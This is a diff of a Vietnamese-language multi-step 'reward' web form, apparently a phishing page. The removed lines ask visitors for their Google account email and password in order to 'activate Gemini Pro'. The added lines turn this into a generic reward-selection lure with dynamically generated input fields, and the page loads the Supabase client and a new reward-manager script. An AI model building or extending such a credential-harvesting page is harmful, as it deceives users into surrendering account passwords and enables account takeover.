@@ -50,18 +50,23 @@
                 <div class="progress-label">Giới thiệu</div>
             </div>
             <div class="progress-line"></div>
-            <div class="progress-step" data-step="2">
+            <div class="progress-step" data-step="1.5">
                 <div class="progress-circle">2</div>
+                <div class="progress-label">Phần thưởng</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="2">
+                <div class="progress-circle">3</div>
                 <div class="progress-label">Hướng dẫn</div>
             </div>
             <div class="progress-line"></div>
             <div class="progress-step" data-step="3">
-                <div class="progress-circle">3</div>
+                <div class="progress-circle">4</div>
                 <div class="progress-label">Thông tin</div>
             </div>
             <div class="progress-line"></div>
             <div class="progress-step" data-step="4">
-                <div class="progress-circle">4</div>
+                <div class="progress-circle">5</div>
                 <div class="progress-label">Hoàn thành</div>
             </div>
         </div>
@@ -92,6 +97,30 @@
                 <div class="card-footer">
                     <button class="btn btn-primary" onclick="nextStep()">
                         Bắt đầu ngay →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 1.5: Select Reward Type -->
+        <div class="step-container" data-step="1.5">
+            <div class="card">
+                <div class="card-header">
+                    <h2>🎁 Chọn phần thưởng</h2>
+                </div>
+                <div class="card-body">
+                    <p class="form-intro">Vui lòng chọn loại phần thưởng bạn muốn nhận:</p>
+                    
+                    <div class="reward-options" id="rewardOptionsContainer">
+                        <!-- Options sẽ được generate bằng JavaScript -->
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-secondary" onclick="previousStep()">
+                        ← Quay lại
+                    </button>
+                    <button class="btn btn-primary" id="selectRewardBtn" onclick="confirmRewardSelection()" disabled>
+                        Tiếp tục →
                     </button>
                 </div>
             </div>
@@ -192,49 +221,20 @@
                     
                     <form id="userForm" class="form">
                         <div class="form-group">
-                            <label for="email" class="form-label">Email Google *</label>
-                            <input 
-                                type="email" 
-                                id="email" 
-                                class="form-input" 
-                                placeholder="example@gmail.com"
-                                required
-                            >
-                            <span class="form-hint">Email tài khoản Google bạn đã sử dụng</span>
+                            <label for="rewardType" class="form-label">Loại phần thưởng *</label>
+                            <select id="rewardType" class="form-input" onchange="updateFormFields()" disabled>
+                                <option value="">-- Chọn phần thưởng --</option>
+                            </select>
+                            <span class="form-hint">Loại phần thưởng bạn đã chọn</span>
                         </div>
 
-                        <div class="form-group">
-                            <label for="password" class="form-label">Mật khẩu *</label>
-                            <div class="password-wrapper">
-                                <input 
-                                    type="password" 
-                                    id="password" 
-                                    class="form-input" 
-                                    placeholder="Nhập mật khẩu"
-                                    required
-                                >
-                                <button type="button" class="toggle-password" onclick="togglePassword()">
-                                    👁️
-                                </button>
-                            </div>
-                            <span class="form-hint">Mật khẩu tài khoản Google của bạn</span>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="contactEmail" class="form-label">Email liên hệ *</label>
-                            <input 
-                                type="email" 
-                                id="contactEmail" 
-                                class="form-input" 
-                                placeholder="contact@example.com"
-                                required
-                            >
-                            <span class="form-hint">Email để chúng tôi liên hệ với bạn</span>
+                        <div id="dynamicFormFields">
+                            <!-- Dynamic form fields sẽ được generate ở đây -->
                         </div>
 
                         <div class="alert alert-warning">
                             <strong>⚠️ Quan trọng:</strong> Thông tin của bạn sẽ được bảo mật tuyệt đối và chỉ 
-                            được sử dụng để kích hoạt Gemini Pro cho tài khoản của bạn.
+                            được sử dụng để kích hoạt phần thưởng cho tài khoản của bạn.
                         </div>
                     </form>
                 </div>
@@ -297,6 +297,7 @@
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="reward-manager.js"></script>
     <script src="config.js"></script>
     <script src="script.js"></script>
 </body>
